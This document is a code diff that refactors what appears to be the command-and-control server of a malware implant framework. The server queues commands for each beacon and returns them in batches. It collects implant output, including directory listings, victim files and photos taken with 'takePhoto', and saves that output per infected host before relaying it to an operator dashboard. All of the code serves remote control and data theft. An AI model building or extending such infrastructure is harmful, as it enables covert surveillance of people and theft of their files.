@@ -108,16 +108,20 @@ def beacon(part1, part2):
                 'jitter': jitter,
             })
 
+    commands = []
     for j in range(len(beacon_commands["beacon_uuid"])):
         if j < len(beacon_commands["executed"]) and beacon_commands["executed"][j]:
             continue
         if beacon_commands["beacon_uuid"][j] == id:
-            data["command_uuid"] = beacon_commands["command_uuid"][j]
-            data["command"] = beacon_commands["command"][j]
-            data["data"] = beacon_commands["command_data"][j]
+            commands.append({
+                "command_uuid": beacon_commands["command_uuid"][j],
+                "command": beacon_commands["command"][j],
+                "data": beacon_commands["command_data"][j]
+            })
             beacon_commands["executed"][j] = True
-
-    if not data:
+    if commands:
+        data["commands"] = commands
+    else:
         data["none"] = "none"
     return jsonify(data), 200
 
@@ -126,42 +130,52 @@ def beacon(part1, part2):
 def response(path1, version):
     if version not in range(1, 11):
         return '', 404
-    output = request.get_json().get('output', '')
-    cid = request.get_json().get('command_uuid', '')
-    found = False
-    for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
-        if cid == command_uuid:
-            found = True
-            if i < len(beacon_commands["command_output"]):
-                beacon_commands["command_output"][i] = output
-                if beacon_commands["command"][i] == "directory_traversal":
-                    # need to handle this properly
-                    print("Directory Traversal Responded, saved to file")
-                    with open("directory_traversal.txt", "w") as f:
-                        f.write(output)
-                elif beacon_commands["command"][i] == ("takePhoto" or "downloadFile"):
-                    print(f"Command {beacon_commands['beacon_uuid'][i]} ",
-                          "responded with: {output}") 
-                    if not os.isdir("~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}"):
-                        os.mkdir("~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}")
-                    with open(f"~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}/{beacon_commands['command_data'][i]}.jpg", "w") as f:
-                        f.write(base64.b64decode(output))
+    json_data = request.get_json()
+    if isinstance(json_data, dict):
+        reports = json_data.get('reports', [])
+    elif isinstance(json_data, list):
+        reports = json_data
+    else:
+        return '', 400
+    for report in reports:
+        cid = report.get('command_uuid', '')
+        output = report.get('output', '')
+        found = False
+        for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
+            if cid == command_uuid:
+                found = True
+                if i < len(beacon_commands["command_output"]):
+                    beacon_commands["command_output"][i] = output
+                    if beacon_commands["command"][i] == "directory_traversal":
+                        # need to handle this properly
+                        print("Directory Traversal Responded, saved to file")
+                        with open("directory_traversal.txt", "w") as f:
+                            f.write(output)
+                    elif beacon_commands["command"][i] in ["takePhoto", "downloadFile"]:
+                        print(f"Command {beacon_commands['beacon_uuid'][i]} ",
+                              f"responded with: {output}") 
+                        dir_path = f"~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}"
+                        if not os.path.isdir(dir_path):
+                            os.mkdir(dir_path)
+                        file_path = os.path.join(dir_path, f"{beacon_commands['command_data'][i]}.jpg")
+                        with open(file_path, "wb") as f:
+                            f.write(base64.b64decode(output))
+                    else:
+                        print(
+                            f"Command {beacon_commands['beacon_uuid'][i]} ",
+                            "responded with:"
+                        )
+                        print(output)
+                    socketio.emit('command_response', {
+                        'uuid': beacon_commands['beacon_uuid'][i],
+                        'command': beacon_commands['command'][i],
+                        'response': output
+                    })
                 else:
                     print(
-                        f"Command {beacon_commands['beacon_uuid'][i]} ",
-                        "responded with:"
+                        f"Index {i} out of range for ",
+                        f"{beacon_commands['command_output']}"
                     )
-                    print(output)
-                socketio.emit('command_response', {
-                    'uuid': beacon_commands['beacon_uuid'][i],
-                    'command': beacon_commands['command'][i],
-                    'response': output
-                })
-            else:
-                print(
-                    f"Index {i} out of range for ",
-                    f"{beacon_commands['command_output']}"
-                )
     if not found:
         return '', 500
     return '', 200
